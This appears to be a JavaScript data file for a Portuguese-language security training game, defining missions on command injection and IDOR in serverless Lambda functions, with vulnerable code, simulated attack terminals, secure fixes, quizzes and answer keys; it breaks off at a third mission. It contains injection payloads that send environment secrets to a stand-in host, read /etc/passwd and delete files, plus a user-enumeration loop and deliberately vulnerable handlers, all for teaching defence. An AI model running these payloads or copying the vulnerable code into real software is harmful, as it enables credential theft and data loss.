

const MISSIONS_DATA = [

 
  {
    id: 1,
    slug: 'escudo-de-vidro',
    title: 'O Escudo de Vidro',
    vector: 'Command Injection',
    difficulty: '★☆☆☆☆',
    time: '~30 min',
    xp: 200,
    unlocked: true,
    rune: 'escudo',
    runeIcon: '⊞',
    briefing: {
      objetivo: 'Identificar, explorar e bloquear command injection em função Lambda que processa input sem validação.',
      contexto: 'Uma função serverless do ÆGIS processa nomes de arquivo enviados pelo cliente para listar metadados. O Loki encontrou o endpoint exposto.',
      impacto: 'Leitura de /etc/passwd, exfiltração de secrets AWS via printenv, execução de reverse shell, deleção de dados críticos.',
    },
    steps: [
      /* ── Step 1: Contexto ── */
      {
        id: 1,
        title: 'o vetor',
        content: `Funções serverless executam código na nuvem em resposta a eventos — sem servidor dedicado, mas <span class="hl">com as mesmas vulnerabilidades de qualquer processo Unix</span>.<br><br>
Quando uma função aceita dados do usuário e os passa para comandos do sistema sem validação, o invasor injeta comandos extras separados por <code>;</code> <code>&&</code> <code>||</code> <code>|</code> <code>\`\`</code> <code>$()</code>.<br><br>
O shell interpreta cada separador como um novo comando — com <span class="danger">as mesmas permissões da função</span>. Em Lambda, isso significa acesso ao IAM role, variáveis de ambiente, filesystem e rede.`,
        diagram: `
┌──────────────────────────────────────────────────────────┐
│         COMMAND INJECTION — ANATOMIA DO ATAQUE           │
├─────────────────────┬────────────────────────────────────┤
│  INPUT LEGÍTIMO     │  INPUT COM INJEÇÃO                 │
├─────────────────────┼────────────────────────────────────┤
│  filename=          │  filename=                         │
│  report.pdf         │  report.pdf; cat /etc/passwd       │
│        ↓            │          ↓                         │
│  ls -la /uploads/   │  ls -la /uploads/report.pdf        │
│  report.pdf         │  ──────────────────────────        │
│        ↓            │  cat /etc/passwd   ← INJETADO      │
│  ✓ resultado OK     │  ──────────────────────────        │
│                     │  rm -rf /tmp/*     ← INJETADO      │
│                     │  ──────────────────────────        │
│                     │  curl loki.sh/c2   ← INJETADO      │
├─────────────────────┴────────────────────────────────────┤
│  SEPARADORES: ;  &&  ||  |  \`cmd\`  $(cmd)               │
│  Todos funcionam. Todos são equivalentes no shell.       │
└──────────────────────────────────────────────────────────┘`,
        aegisTip: 'O shell interpreta ; como separador de comandos. Cada ; é uma porta. Input sem validação abre quantas portas o atacante quiser.',
      },

      /* ── Step 2: O Ataque ── */
      {
        id: 2,
        title: 'o código vulnerável',
        vulnLabel: '⚠ vulnerável',
        vulnCode: `<span class="ln">1</span> <span class="cm">// Lambda Node.js — processa filename sem validação</span>
<span class="ln">2</span> <span class="kw">const</span> { exec } = <span class="kw">require</span>(<span class="str">'child_process'</span>);
<span class="ln">3</span>
<span class="ln">4</span> <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">5</span>   <span class="kw">const</span> filename = event.queryStringParameters.<span class="fn">filename</span>;
<span class="ln">6</span>   <span class="cm">// ⚠ linha 7: input direto no shell — ponto de injeção</span>
<span class="ln">7</span>   <span class="kw">const</span> cmd = <span class="bad">\`ls -la /uploads/\${filename}\`</span>;
<span class="ln">8</span>   <span class="kw">return new</span> <span class="fn">Promise</span>((resolve) => {
<span class="ln">9</span>     <span class="fn">exec</span>(cmd, (err, stdout) => {
<span class="ln">10</span>      resolve({ statusCode: <span class="str">200</span>, body: stdout });
<span class="ln">11</span>    });
<span class="ln">12</span>  });
<span class="ln">13</span> };`,
        attackBox: {
          title: '// simulação de ataque',
          content: `O Loki envia como <code>filename</code>:<br>
<div class="code-block" style="margin:8px 0;font-size:11px;"><span class="bad">report.pdf; printenv | curl -d @- loki.sh/c2; rm -rf /tmp</span></div>
O servidor executa <strong>três comandos</strong>: lista o arquivo, exfiltra todas as variáveis de ambiente (incluindo <code>AWS_SECRET_ACCESS_KEY</code>), e apaga /tmp.`,
        },
        aegisTip: 'O problema está na linha 7. O template literal passa o input diretamente ao shell. exec() invoca o shell — qualquer separador é interpretado.',

        /* ── LAB 1: Terminal Simulation ── */
        lab: {
          type: 'terminal',
          title: '// LAB 1 — Simule o ataque',
          description: 'Execute os payloads abaixo no terminal simulado e observe o que acontece. Entenda o impacto antes de defender.',
          xpReward: 30,
          terminal: {
            prompt: 'lambda@aegis:~$',
            prelude: [
              '// Ambiente: AWS Lambda Node.js 18',
              '// Variáveis: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DB_PASSWORD',
              '// Função vulnerável exposta em: POST /api/files?filename=<input>',
              '',
            ],
            challenges: [
              {
                instruction: 'Execute o payload básico — descubra o usuário atual:',
                payload: 'report.pdf; whoami',
                expectedOutput: [
                  'ls: /uploads/report.pdf: No such file or directory',
                  'sbx_user1051  ← você viu isso. O Loki também.',
                ],
                hint: 'O ; separa dois comandos. O segundo executa como o usuário da Lambda.',
              },
              {
                instruction: 'Exfiltre as credenciais AWS da função:',
                payload: 'x; printenv | grep -i aws',
                expectedOutput: [
                  'AWS_ACCESS_KEY_ID=ASIA3XKYZABC123456',
                  'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
                  'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEJr...',
                  '',
                  '// Essas credenciais dão acesso ao IAM role da função.',
                  '// O Loki já enviou isso para loki.sh/c2.',
                ],
                hint: 'printenv lista todas as variáveis de ambiente — incluindo as credenciais temporárias AWS.',
              },
              {
                instruction: 'Tente usar $(comando) — substitution de subshell:',
                payload: 'file$(id).pdf',
                expectedOutput: [
                  'ls: /uploads/fileuid=993(sbx_user1051) gid=990(sbx_user1051).pdf: No such file or directory',
                  '',
                  '// $(id) foi executado e o resultado foi interpolado no nome do arquivo.',
                  '// Qualquer $() funciona da mesma forma.',
                ],
                hint: '$() é equivalente a backticks. O shell executa o conteúdo e substitui na string.',
              },
            ],
            finalMessage: '// Lab 1 completo. Você viu como ; && $() funcionam. Agora vá para a defesa.',
          },
        },
      },

      /* ── Step 3: Lab Prático ── */
      {
        id: 3,
        title: 'lab — identifique o vetor',
        aegisTip: 'Antes de defender, identifique exatamente onde o código falha. A defesa específica é mais robusta que a genérica.',
        lab: {
          type: 'multiChoice',
          title: '// LAB 2 — Diagnóstico de código',
          description: 'Analise os trechos abaixo. Para cada um, identifique se é vulnerável e por quê. Sem dica — você já viu o código.',
          xpReward: 40,
          questions: [
            {
              code: `const cmd = \`convert \${req.body.format} input.png output.jpg\`;
exec(cmd);`,
              q: 'Este código é vulnerável?',
              opts: [
                'Não — convert é uma ferramenta segura',
                'Sim — req.body.format vai direto ao shell via exec()',
                'Só se format contiver espaços',
                'Não — o input é uma string, não um número',
              ],
              correct: 1,
              exp: 'exec() invoca o shell. Qualquer string com ; | && vai ao shell intacta. format="-quality 80; cat /etc/passwd" funciona.',
            },
            {
              code: `const filename = sanitize(req.query.file); // remove < > "
const cmd = \`wc -l /data/\${filename}\`;
execFile('/usr/bin/wc', ['-l', '/data/' + filename]);`,
              q: 'Qual linha é segura e qual ainda é vulnerável?',
              opts: [
                'Ambas são vulneráveis — sanitize não é suficiente',
                'Linha 2 (exec template) é vulnerável. Linha 3 (execFile) é segura.',
                'Ambas são seguras — sanitize remove chars perigosos',
                'Linha 3 é vulnerável — execFile também usa shell',
              ],
              correct: 1,
              exp: 'execFile() não invoca shell — args são passados como array. ; e && são literais. exec() com template string ainda é vulnerável mesmo com sanitize parcial.',
            },
            {
              code: `const input = req.params.id;
if (!/[;&|]/.test(input)) {
  exec(\`ls /files/\${input}\`);
}`,
              q: 'A validação na linha 2 é suficiente?',
              opts: [
                'Sim — bloqueia todos os separadores de comando',
                'Não — $() e backticks não estão na blacklist',
                'Sim — se não há ;|& o exec é seguro',
                'Não — mas só porque faltou && na regex',
              ],
              correct: 1,
              exp: 'Blacklist é sempre incompleta. $(id) executa um subshell. `whoami` também. %0a (newline) em alguns shells. Abordagem correta: whitelist do que é permitido.',
            },
          ],
        },
      },

      /* ── Step 4: A Defesa ── */
      {
        id: 4,
        title: 'a defesa',
        defensePoints: [
          'Regex whitelist <code>/^[\\w\\-\\.]+$/</code> — aceita apenas o esperado, rejeita tudo mais.',
          '<code>execFile</code> em vez de <code>exec</code> — sem shell intermediário, ; é literal.',
          '<code>path.basename()</code> — neutraliza <code>../../../etc/passwd</code> path traversal.',
        ],
        secureLabel: '✓ seguro',
        secureCode: `<span class="ln">1</span>  <span class="kw">const</span> { execFile } = <span class="kw">require</span>(<span class="str">'child_process'</span>);
<span class="ln">2</span>  <span class="kw">const</span> path = <span class="kw">require</span>(<span class="str">'path'</span>);
<span class="ln">3</span>
<span class="ln">4</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">5</span>    <span class="kw">const</span> raw = event.queryStringParameters.<span class="fn">filename</span>;
<span class="ln">6</span>
<span class="ln">7</span>    <span class="cm">// 1. Whitelist — só letras, números, hífen, ponto, underscore</span>
<span class="ln">8</span>    <span class="good">if (!/^[\\w\\-\\.]+$/.test(raw))</span>
<span class="ln">9</span>    <span class="good">  return { statusCode: 400, body: 'input inválido' };</span>
<span class="ln">10</span>
<span class="ln">11</span>   <span class="cm">// 2. path.basename — remove traversal (../../../)</span>
<span class="ln">12</span>   <span class="good">const safe = path.basename(raw);</span>
<span class="ln">13</span>   <span class="good">const full = path.join('/uploads', safe);</span>
<span class="ln">14</span>
<span class="ln">15</span>   <span class="cm">// 3. execFile — sem shell, args são literais</span>
<span class="ln">16</span>   <span class="good">return new Promise((resolve) => {</span>
<span class="ln">17</span>   <span class="good">  execFile('ls', ['-la', full], (err, out) => {</span>
<span class="ln">18</span>   <span class="good">    if (err) return resolve({ statusCode: 404, body: 'not found' });</span>
<span class="ln">19</span>   <span class="good">    resolve({ statusCode: 200, body: out });</span>
<span class="ln">20</span>   <span class="good">  });</span>
<span class="ln">21</span>   <span class="good">});</span>
<span class="ln">22</span>  };`,
        aegisTip: 'Três camadas independentes. Se retirar qualquer uma, o Loki encontra o gap. Defesa real é em profundidade.',

        /* ── LAB 3: Code Fix ── */
        lab: {
          type: 'fillBlank',
          title: '// LAB 3 — Complete a defesa',
          description: 'Preencha os blanks com o código correto. As respostas estão no código seguro acima — mas você precisa entender o porquê de cada uma.',
          xpReward: 50,
          template: `exports.handler = async (event) => {
  const raw = event.queryStringParameters.filename;

  // Passo 1: validação whitelist
  if (!___BLANK1___.test(raw))
    return { statusCode: 400, body: 'input inválido' };

  // Passo 2: neutralizar path traversal
  const safe = ___BLANK2___(raw);
  const full = path.join('/uploads', safe);

  // Passo 3: executar sem shell
  return new Promise((resolve) => {
    ___BLANK3___('ls', ['-la', full], (err, out) => {
      resolve({ statusCode: 200, body: out });
    });
  });
};`,
          blanks: [
            {
              id: 'BLANK1',
              label: 'Regex whitelist (ex: /^padrão$/)',
              answer: '/^[\\w\\-\\.]+$/',
              alternatives: ['/^[a-zA-Z0-9._-]+$/', '/^[\\w.-]+$/'],
              hint: 'Aceitar apenas letras, números, underline, hífen e ponto.',
            },
            {
              id: 'BLANK2',
              label: 'Função para remover path traversal',
              answer: 'path.basename',
              alternatives: ['basename'],
              hint: 'Módulo path do Node.js. Retorna apenas o nome do arquivo, sem diretórios.',
            },
            {
              id: 'BLANK3',
              label: 'Função de execução sem shell',
              answer: 'execFile',
              alternatives: [],
              hint: 'Não usa shell intermediário. Args são array literal, não string.',
            },
          ],
        },
      },

      /* ── Step 5: Checkpoint Quiz ── */
      {
        id: 5,
        title: 'checkpoint final',
        aegisTip: 'Quiz sem dica. Você absorveu o conteúdo ou apenas passou os olhos? O Loki vai descobrir.',
      },
    ],

    quiz: [
      {
        q: 'Por que exec() com template string é perigoso mesmo com sanitização parcial?',
        opts: [
          'exec() é síncrono e bloqueia o event loop do Node',
          'O shell invocado por exec() interpreta separadores como ; && $() antes de qualquer sanitização da aplicação',
          'exec() não suporta template strings no Node.js 18',
          'exec() tem limite de 8KB de output que pode causar buffer overflow',
        ],
        correct: 1,
        exp: 'exec() invoca /bin/sh que interpreta toda a string como shell. Sanitização parcial (blacklist de chars) não cobre todas as formas: $(cmd), `cmd`, encodings URL.',
      },
      {
        q: 'Qual é a diferença fundamental entre exec() e execFile() em Node.js?',
        opts: [
          'execFile() é assíncrono, exec() é síncrono',
          'exec() passa a string para /bin/sh. execFile() executa o binário diretamente com args como array — sem shell',
          'execFile() só funciona com binários no PATH',
          'exec() tem melhor performance em produção',
        ],
        correct: 1,
        exp: 'exec(\'ls -la\' + input) → shell interpreta tudo. execFile(\'ls\', [\'-la\', input]) → ls recebe input como argumento literal. ; é texto, não separador.',
      },
      {
        q: 'path.basename("../../../etc/passwd") retorna o quê?',
        opts: [
          '"../../../etc/passwd" — não altera o path',
          '"etc/passwd" — remove apenas o primeiro ../',
          '"passwd" — retorna apenas o nome do arquivo',
          'Lança exceção — path inválido',
        ],
        correct: 2,
        exp: 'path.basename retorna o último segmento do path. "../../../etc/passwd" → "passwd". O path.join("/uploads", "passwd") resulta em "/uploads/passwd" — sem traversal.',
      },
      {
        q: 'Uma regex de BLACKLIST como /[;&|$`]/ é suficiente para prevenir command injection?',
        opts: [
          'Sim — cobre todos os separadores de comando conhecidos',
          'Não — $() sem espaço, newlines (%0a), encodings e variações podem escapar da regex',
          'Sim — se combinada com encode do input',
          'Não — mas só porque faltou o char && na regex',
        ],
        correct: 1,
        exp: 'Blacklist é sempre incompleta por definição. Whitelist (/^[\\w\\-\\.]+$/) define o que é permitido — tudo mais é rejeitado, inclusive formas futuras de ataque.',
      },
      {
        q: 'Em qual linha do código vulnerável o ataque é possível e por quê?',
        opts: [
          'Linha 5 — event.queryStringParameters sem validação de tipo',
          'Linha 7 — template string passa input sem sanitização diretamente ao exec()',
          'Linha 9 — exec() não verifica o retorno do comando',
          'Linha 10 — statusCode 200 retorna dados sem sanitização',
        ],
        correct: 1,
        exp: 'A linha 7 é o ponto de injeção: `ls -la /uploads/${filename}` constrói uma string que vai inteira ao shell. O filename pode ser "x; cat /etc/passwd" e ambos executam.',
      },
    ],
  },

  /* ═══════════════════════════════════════════════════════
     MISSÃO 02 — O Labirinto de Objetos (IDOR)
     Dificuldade: ★★☆☆☆  →  mais técnico
  ═══════════════════════════════════════════════════════ */
  {
    id: 2,
    slug: 'labirinto-de-objetos',
    title: 'O Labirinto de Objetos',
    vector: 'IDOR',
    difficulty: '★★☆☆☆',
    time: '~35 min',
    xp: 300,
    unlocked: false,
    rune: 'labirinto',
    runeIcon: '◈',
    briefing: {
      objetivo: 'Explorar IDOR em API Lambda e implementar controle de acesso baseado em identidade real do token.',
      contexto: 'API do ÆGIS expõe dados de usuário via query param. Autenticação existe — autorização não.',
      impacto: 'Acesso horizontal a dados de qualquer usuário, escalada vertical para admin, vazamento de PII em massa.',
    },
    steps: [
      {
        id: 1,
        title: 'o vetor',
        content: `<span class="hl">IDOR — Insecure Direct Object Reference</span>. A falha mais comum em APIs REST, e a menos detectável por scanners automáticos.<br><br>
O usuário está autenticado — o token é válido. Mas a função usa um identificador <span class="warn">controlável pelo cliente</span> para acessar objetos, sem verificar se aquele cliente tem permissão sobre aquele objeto.<br><br>
<span class="hl">Autenticação</span> (quem você é) ≠ <span class="hl">Autorização</span> (o que você pode fazer).<br><br>
Em serverless, sem estado de sessão persistente, a verificação de ownership precisa acontecer em cada invocação, dentro da própria função — não há middleware automático.`,
        diagram: `
┌──────────────────────────────────────────────────────────┐
│              IDOR — MAPEAMENTO DO ATAQUE                 │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Atacante: user_id = 42, token JWT válido               │
│                                                          │
│  GET /profile?userId=42   → ✓ próprio perfil (normal)   │
│  GET /profile?userId=43   → ✓ perfil alheio  ← IDOR    │
│  GET /profile?userId=1    → ✓ perfil do admin ← IDOR    │
│  GET /orders?orderId=9999 → ✓ pedido de outro ← IDOR    │
│                                                          │
│  A função não confere: "userId=42 pode ver userId=1?"   │
│  Ela simplesmente busca o que foi pedido.               │
│                                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │  O token prova QUEM você é.                     │    │
│  │  Mas não prova O QUE você pode acessar.         │    │
│  │  São dois checks diferentes. IDOR pula o 2º.   │    │
│  └─────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────┘`,
        aegisTip: 'O servidor não deve confiar em nenhum identificador vindo do cliente para determinar autorização. Identidade real vem do token — nunca do body ou query param.',
      },

      {
        id: 2,
        title: 'o código vulnerável',
        vulnLabel: '⚠ vulnerável',
        vulnCode: `<span class="ln">1</span>  <span class="cm">// Lambda — endpoint de perfil com IDOR</span>
<span class="ln">2</span>  <span class="kw">const</span> db = <span class="kw">require</span>(<span class="str">'./db'</span>);
<span class="ln">3</span>
<span class="ln">4</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">5</span>    <span class="cm">// Token verificado — mas não usado para autorização</span>
<span class="ln">6</span>    <span class="kw">const</span> token = event.headers.Authorization;
<span class="ln">7</span>    <span class="kw">if</span> (!token) <span class="kw">return</span> { statusCode: <span class="str">401</span> };
<span class="ln">8</span>
<span class="ln">9</span>    <span class="cm">// ⚠ userId controlado pelo cliente</span>
<span class="ln">10</span>   <span class="kw">const</span> userId = <span class="bad">event.queryStringParameters.userId</span>;
<span class="ln">11</span>
<span class="ln">12</span>   <span class="cm">// ⚠ busca direta — sem verificar ownership</span>
<span class="ln">13</span>   <span class="kw">const</span> user = <span class="kw">await</span> db.<span class="fn">getUser</span>(<span class="bad">userId</span>);
<span class="ln">14</span>
<span class="ln">15</span>   <span class="kw">return</span> { statusCode: <span class="str">200</span>, body: <span class="fn">JSON.stringify</span>(user) };
<span class="ln">16</span>  };`,
        attackBox: {
          title: '// vetor de exploração',
          content: `Com token válido de user_id=42, o Loki faz:<br>
<div class="code-block" style="margin:8px 0;"><span class="bad">GET /profile?userId=1   → admin com email, role, hash de senha
GET /profile?userId=2   → outro usuário
GET /profile?userId=999 → dados financeiros expostos</span></div>
Nenhum erro. Nenhum log suspeito. A função <strong>simplesmente obedeceu</strong>.`,
        },
        aegisTip: 'O atacante não invadiu nada. Pediu dados de outro usuário e a função entregou. Autenticação passou — autorização nunca foi verificada.',

        lab: {
          type: 'terminal',
          title: '// LAB 1 — Explore o IDOR',
          description: 'Você é o Guardião 42. Use o terminal para entender o que o Loki consegue acessar com seu token válido.',
          xpReward: 35,
          terminal: {
            prompt: 'guardiao@aegis:~$',
            prelude: [
              '// Token JWT válido para user_id: 42',
              '// Endpoint: GET /api/profile?userId=<id>',
              '// Autorização: Bearer eyJhbGciOiJIUzI1NiJ9...',
              '',
            ],
            challenges: [
              {
                instruction: 'Acesse seu próprio perfil (userId=42):',
                payload: 'curl /api/profile?userId=42 -H "Authorization: Bearer TOKEN"',
                expectedOutput: [
                  '{ "id": 42, "nick": "guardiao42", "email": "g42@aegis.com",',
                  '  "role": "user", "score": 1930, "missions_done": 3 }',
                  '',
                  '// Normal. Esperado.',
                ],
                hint: 'Isso é o comportamento esperado. Seu perfil, seu acesso.',
              },
              {
                instruction: 'Acesse o perfil de outro usuário (userId=1):',
                payload: 'curl /api/profile?userId=1 -H "Authorization: Bearer TOKEN"',
                expectedOutput: [
                  '{ "id": 1, "nick": "admin_root", "email": "admin@aegis-internal.com",',
                  '  "role": "super_admin", "score": 9999,',
                  '  "api_key": "sk_live_aegis_7f3kd9...", "internal_notes": "..." }',
                  '',
                  '// Você recebeu dados do admin. Com seu token de usuário comum.',
                  '// O Loki recebeu a api_key. Acesso total à API.',
                ],
                hint: 'O token é válido, mas a função não verifica se userId=42 pode ver userId=1.',
              },
              {
                instruction: 'Enumerate outros usuários (userId=100 a 105):',
                payload: 'for id in 100 101 102 103 104 105; do curl /api/profile?userId=$id; done',
                expectedOutput: [
                  '{ "id": 100, "email": "ana@company.com", "cpf": "123.456.789-00", "saldo": 15234.50 }',
                  '{ "id": 101, "email": "carlos@company.com", "cpf": "987.654.321-00", "saldo": 8900.00 }',
                  '{ "id": 102, "email": "lucia@company.com", "cpf": "456.789.123-00", "saldo": 22100.75 }',
                  '...',
                  '',
                  '// 6 usuários. 6 CPFs. 6 saldos bancários.',
                  '// Em produção: 50.000 usuários em ~2 minutos de script.',
                ],
                hint: 'IDOR escala. Com IDs sequenciais, enumerar todos os usuários é trivial.',
              },
            ],
            finalMessage: '// Você viu o IDOR em ação. O dano não vem de um ataque — vem de centenas de requests normais com IDs diferentes.',
          },
        },
      },

      {
        id: 3,
        title: 'lab — diagnóstico de autorização',
        aegisTip: 'Identificar onde a autorização falha é a metade do trabalho. A outra metade é saber o que verificar.',
        lab: {
          type: 'multiChoice',
          title: '// LAB 2 — Encontre o bug de autorização',
          description: 'Analise cada implementação. Identifique se a autorização está correta, parcialmente correta, ou ausente.',
          xpReward: 45,
          questions: [
            {
              code: `exports.handler = async (event) => {
  const token = jwt.verify(event.headers.Authorization, SECRET);
  const userId = event.queryStringParameters.userId;
  if (!token) return { statusCode: 401 };
  const user = await db.getUser(userId);
  return { statusCode: 200, body: JSON.stringify(user) };
};`,
              q: 'Esta implementação está correta?',
              opts: [
                'Sim — token é verificado antes de buscar dados',
                'Não — o token é verificado mas userId não é comparado ao token.sub',
                'Sim — jwt.verify garante que o usuário é legítimo',
                'Não — faltou hash do userId antes de passar ao db',
              ],
              correct: 1,
              exp: 'jwt.verify prova que o token é legítimo, mas não que userId=X pertence a quem fez o request. token.sub pode ser "42" enquanto userId é "1". A comparação está faltando.',
            },
            {
              code: `const decoded = jwt.verify(token, SECRET);
const userId = event.queryStringParameters.userId;

// Proteção implementada:
if (decoded.role !== 'admin' && decoded.sub !== userId) {
  return { statusCode: 403, body: 'acesso negado' };
}`,
              q: 'Há um bug sutil nesta implementação. Qual é?',
              opts: [
                'Não há bug — admin pode tudo, user vê apenas o seu',
                'decoded.sub é number e userId é string — a comparação !== pode falhar por tipo',
                'decoded.role deveria ser verificado com === ao invés de !==',
                'jwt.verify pode retornar null sem lançar exceção',
              ],
              correct: 1,
              exp: 'decoded.sub é number (42) no JWT. event.queryStringParameters.userId é string ("42"). "42" !== 42 é true em JS — a proteção falha silenciosamente. Use == ou converta os tipos.',
            },
            {
              code: `const decoded = jwt.verify(token, SECRET);
const orderId = event.pathParameters.orderId;

const order = await db.query(
  'SELECT * FROM orders WHERE id = ? AND user_id = ?',
  [orderId, decoded.sub]
);

if (!order) return { statusCode: 404 };
return { statusCode: 200, body: JSON.stringify(order) };`,
              q: 'Este código protege contra IDOR?',
              opts: [
                'Não — decoded.sub pode ser manipulado pelo cliente',
                'Sim — o query filtra pelo user_id do token. Se o pedido não pertence ao usuário, retorna 404.',
                'Parcialmente — protege leitura mas não edição',
                'Não — WHERE com dois campos é mais lento e propenso a SQL injection',
              ],
              correct: 1,
              exp: 'Correto. decoded.sub vem do JWT verificado pelo servidor — não é controlável pelo cliente. O WHERE user_id = decoded.sub garante que só pedidos do próprio usuário retornam.',
            },
          ],
        },
      },

      {
        id: 4,
        title: 'a defesa',
        defensePoints: [
          'Extrair identidade do JWT verificado — nunca do query param ou body.',
          'Comparar <code>token.sub === requestedId</code> com verificação de tipo explícita.',
          'Admin scope separado com verificação explícita de role na policy.',
        ],
        secureLabel: '✓ seguro',
        secureCode: `<span class="ln">1</span>  <span class="kw">const</span> jwt = <span class="kw">require</span>(<span class="str">'jsonwebtoken'</span>);
<span class="ln">2</span>  <span class="kw">const</span> db  = <span class="kw">require</span>(<span class="str">'./db'</span>);
<span class="ln">3</span>
<span class="ln">4</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">5</span>    <span class="cm">// 1. Verificar e decodificar token</span>
<span class="ln">6</span>    <span class="kw">const</span> authHeader = event.headers.Authorization || <span class="str">''</span>;
<span class="ln">7</span>    <span class="good">if (!authHeader.startsWith('Bearer ')) return { statusCode: 401 };</span>
<span class="ln">8</span>    <span class="good">const decoded = jwt.verify(authHeader.split(' ')[1], process.env.JWT_SECRET, {</span>
<span class="ln">9</span>    <span class="good">  algorithms: ['HS256'] });</span>
<span class="ln">10</span>
<span class="ln">11</span>   <span class="cm">// 2. Identidade do token — não do cliente</span>
<span class="ln">12</span>   <span class="good">const tokenUserId = String(decoded.sub);  // forçar string</span>
<span class="ln">13</span>   <span class="kw">const</span> requestedId = String(event.queryStringParameters.userId);
<span class="ln">14</span>
<span class="ln">15</span>   <span class="cm">// 3. Autorização: só vê o próprio perfil (exceto admin)</span>
<span class="ln">16</span>   <span class="good">const isAdmin = decoded.roles?.includes('admin') === true;</span>
<span class="ln">17</span>   <span class="good">if (tokenUserId !== requestedId && !isAdmin)</span>
<span class="ln">18</span>   <span class="good">  return { statusCode: 403, body: 'acesso negado' };</span>
<span class="ln">19</span>
<span class="ln">20</span>   <span class="kw">const</span> user = <span class="kw">await</span> db.<span class="fn">getUser</span>(requestedId);
<span class="ln">21</span>   <span class="kw">return</span> { statusCode: <span class="str">200</span>, body: <span class="fn">JSON.stringify</span>(user) };
<span class="ln">22</span>  };`,
        aegisTip: 'Identidade do token. Autorização antes de qualquer leitura. Tipos explícitos. Esse é o padrão para cada endpoint.',

        lab: {
          type: 'fillBlank',
          title: '// LAB 3 — Implemente a autorização',
          description: 'Complete o código de autorização. Cada blank é uma decisão de segurança.',
          xpReward: 55,
          template: `exports.handler = async (event) => {
  const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });

  // Identidade real vem do token
  const tokenUserId = ___BLANK1___(decoded.sub);
  const requestedId = ___BLANK1___(event.queryStringParameters.userId);

  // Verificar se tem role de admin
  const isAdmin = decoded.roles?.___BLANK2___('admin') === true;

  // Bloquear acesso cruzado
  if (tokenUserId ___BLANK3___ requestedId && !isAdmin)
    return { statusCode: ___BLANK4___, body: 'acesso negado' };

  return { statusCode: 200, body: JSON.stringify(await db.getUser(requestedId)) };
};`,
          blanks: [
            {
              id: 'BLANK1',
              label: 'Função para converter para string (evitar bug de tipo)',
              answer: 'String',
              alternatives: ['String()', 'toString'],
              hint: 'decoded.sub é number, queryStringParameters é string. Comparar tipos diferentes com !== pode falhar.',
            },
            {
              id: 'BLANK2',
              label: 'Método de array para verificar se inclui um valor',
              answer: 'includes',
              alternatives: [],
              hint: 'Verifica se "admin" está no array de roles.',
            },
            {
              id: 'BLANK3',
              label: 'Operador de comparação estrita',
              answer: '!==',
              alternatives: ['!='],
              hint: 'Se o userId do token é diferente do solicitado, e não é admin — negar.',
            },
            {
              id: 'BLANK4',
              label: 'HTTP status para acesso proibido (autenticado mas sem permissão)',
              answer: '403',
              alternatives: [],
              hint: '401 = não autenticado. 403 = autenticado mas sem permissão.',
            },
          ],
        },
      },

      {
        id: 5,
        title: 'checkpoint final',
        aegisTip: 'IDOR é invisível nos logs de erro — parece um request normal. Só detecção por anomalia ou rate-of-access revela.',
      },
    ],

    quiz: [
      {
        q: 'Qual é a definição precisa de IDOR?',
        opts: [
          'Uso de criptografia fraca em identificadores de sessão',
          'Acesso a objetos via identificador controlável pelo cliente sem verificação de autorização sobre o objeto específico',
          'Injeção de código via parâmetros de URL codificados em Base64',
          'Ausência de autenticação em endpoints públicos',
        ],
        correct: 1,
        exp: 'IDOR é especificamente sobre autorização sobre objetos, não autenticação. O usuário está autenticado — mas acessa objetos que não pertencem a ele por manipular o identificador.',
      },
      {
        q: 'decoded.sub do JWT é do tipo number (42). event.queryStringParameters.userId é string ("42"). O que acontece com decoded.sub !== userId?',
        opts: [
          'Retorna false — 42 e "42" são iguais',
          'Retorna true — tipos diferentes, comparação estrita falha, proteção quebra',
          'Lança TypeError — comparação de tipos incompatíveis',
          'Retorna false apenas se o valor for menor que 100',
        ],
        correct: 1,
        exp: '42 !== "42" é true em JavaScript (comparação estrita). A condição de proteção é verdadeira para o usuário legítimo — bloqueando acesso ao próprio perfil. E falsa para IDs diferentes do mesmo valor.',
      },
      {
        q: 'Por que IDs sequenciais (1, 2, 3...) agravam o impacto de IDOR?',
        opts: [
          'São mais fáceis de armazenar no banco de dados',
          'Permitem enumeração trivial de todos os objetos sem conhecimento prévio dos IDs',
          'São incompatíveis com JWT pelo tamanho do payload',
          'Causam colisões de índice no banco quando há muitos usuários',
        ],
        correct: 1,
        exp: 'IDs sequenciais são predizíveis. Um script percorre 1 a 100.000 e coleta todos os objetos acessíveis. UUIDs dificultam mas não eliminam IDOR — apenas exigem um ID válido como ponto de partida.',
      },
      {
        q: 'Qual query SQL implementa corretamente a proteção de IDOR para pedidos?',
        opts: [
          'SELECT * FROM orders WHERE id = :orderId',
          'SELECT * FROM orders WHERE id = :orderId AND user_id = :tokenSub',
          'SELECT * FROM orders WHERE user_id = :tokenSub LIMIT 1',
          'SELECT * FROM orders WHERE id = :orderId OR user_id = :tokenSub',
        ],
        correct: 1,
        exp: 'WHERE id = X AND user_id = tokenSub garante que o pedido pertence ao usuário do token. Se o orderId não pertencer ao user, retorna null — não expõe dados e não revela que o objeto existe.',
      },
      {
        q: 'Como detectar tentativas de IDOR em produção?',
        opts: [
          'Monitorar erros 500 — IDOR geralmente causa exceções no servidor',
          'Analisar padrões de acesso: um userId fazendo requests com muitos resourceIds diferentes em pouco tempo',
          'Verificar o tamanho dos tokens JWT — tokens maiores indicam enumeração',
          'IDOR não pode ser detectado — é indistinguível de uso normal',
        ],
        correct: 1,
        exp: 'IDOR parece tráfego normal no log individual. A anomalia é estatística: userId=42 acessando resourceIds 1, 2, 3, ..., 1000 em sequência em 2 minutos. Rate limiting + anomaly detection por padrão de acesso.',
      },
    ],
  },

  /* ═══════════════════════════════════════════════════════
     MISSÃO 03 — A Chave Quebrada (Broken Authentication)
     Dificuldade: ★★★☆☆  →  intermediário técnico
  ═══════════════════════════════════════════════════════ */
  {
    id: 3,
    slug: 'chave-quebrada',
    title: 'A Chave Quebrada',
    vector: 'Broken Auth',
